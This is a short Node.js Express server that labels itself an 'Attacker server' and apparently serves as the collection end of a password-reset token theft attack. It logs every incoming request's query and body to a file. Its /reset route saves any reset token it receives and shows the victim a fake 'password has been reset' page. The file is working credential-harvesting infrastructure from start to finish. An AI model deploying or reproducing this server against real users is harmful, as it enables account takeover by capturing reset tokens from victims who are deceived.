
const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Log all requests
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} - ${req.method} ${req.url} - Query: ${JSON.stringify(req.query)} - Body: ${JSON.stringify(req.body)}\n`;
    fs.appendFileSync('/app/logs/capture.log', logEntry);
    console.log(logEntry);
    next();
});

// Capture reset tokens
app.get('/reset', (req, res) => {
    const token = req.query.token;
    if (token) {
        console.log(`🎯 CAPTURED TOKEN: ${token}`);
        const capture = `CAPTURED TOKEN: ${token} at ${new Date().toISOString()}\n`;
        fs.appendFileSync('/app/logs/captured_tokens.log', capture);
    }
    res.send('<h1>Password Reset</h1><p>Your password has been reset!</p>');
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'running', captures: 'active' });
});

app.listen(port, '0.0.0.0', () => {
    console.log(`🔥 Attacker server running on port ${port}`);
    console.log(`📝 Logs saved to /app/logs/`);
});
